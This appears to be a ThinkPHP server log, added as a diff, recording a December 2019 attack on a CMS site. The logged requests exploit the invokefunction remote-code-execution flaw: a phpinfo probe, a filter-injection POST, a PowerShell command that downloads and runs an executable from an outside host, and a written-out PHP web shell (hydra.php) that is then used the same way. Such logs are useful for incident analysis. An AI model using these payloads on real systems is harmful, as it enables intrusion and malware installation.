@@ -1,0 +1,221 @@
+---------------------------------------------------------------
+[ 2019-12-09T11:26:28+08:00 ] 220.180.239.88 GET 114.115.146.220/public/index.php
+[运行时间：0.484232s] [吞吐率：2.07req/s] [内存消耗：750.09kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000210s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.024535s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.024578s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.028699s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.001147s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000309s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-09T11:26:28+08:00 ] 220.180.239.88 GET 114.115.146.220/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+[运行时间：0.018058s] [吞吐率：55.38req/s] [内存消耗：343.21kb] [文件加载：118]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000115s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001001s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001038s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'phpinfo',
+    1 => 
+    array (
+      0 => '1',
+    ),
+  ),
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000300s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-09T11:26:28+08:00 ] 220.180.239.88 POST 114.115.146.220/public/index.php?s=captcha
+[运行时间：0.010720s] [吞吐率：93.28req/s] [内存消耗：333.96kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000765s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000801s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'captcha',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Go-http-client/1.1',
+  'content-length' => '84',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+  'filter' => 
+  array (
+    0 => 'system',
+  ),
+  'method' => 'get',
+  'server' => 
+  array (
+    'REQUEST_METHOD' => 'uname',
+  ),
+  'ipconfig' => '',
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000204s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-09T11:28:06+08:00 ] 114.115.184.18 GET 114.115.146.220/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/bmlhggsflrnrend14224.exe');start%20%SystemRoot%/Temp/bmlhggsflrnrend14224.exe
+[运行时间：0.018149s] [吞吐率：55.10req/s] [内存消耗：345.38kb] [文件加载：118]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000847s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000881s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://114.115.146.220:80/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => '114.115.146.220',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
+    ),
+  ),
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000258s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-09T11:28:06+08:00 ] 114.115.184.18 GET 114.115.146.220/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php
+[运行时间：0.010879s] [吞吐率：91.92req/s] [内存消耗：344.46kb] [文件加载：118]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000053s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000684s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000717s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://114.115.146.220:80/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET[\'xcmd\'];system($action);?^>>hydra.php',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => '114.115.146.220',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'echo ^<?php $action = $_GET[\'xcmd\'];system($action);?^>>hydra.php',
+    ),
+  ),
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000202s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-09T11:28:06+08:00 ] 114.115.184.18 GET 114.115.146.220/public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/bmlhggsflrnrend14224.exe');start%20%SystemRoot%/Temp/bmlhggsflrnrend14224.exe
+[运行时间：0.009644s] [吞吐率：103.69req/s] [内存消耗：335.61kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000052s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000672s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000714s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'hydra.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://114.115.146.220:80/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => '114.115.146.220',
+)
+[ info ] [ PARAM ] array (
+  'xcmd' => 'cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000192s ]
+[ info ] [ LOG ] INIT File
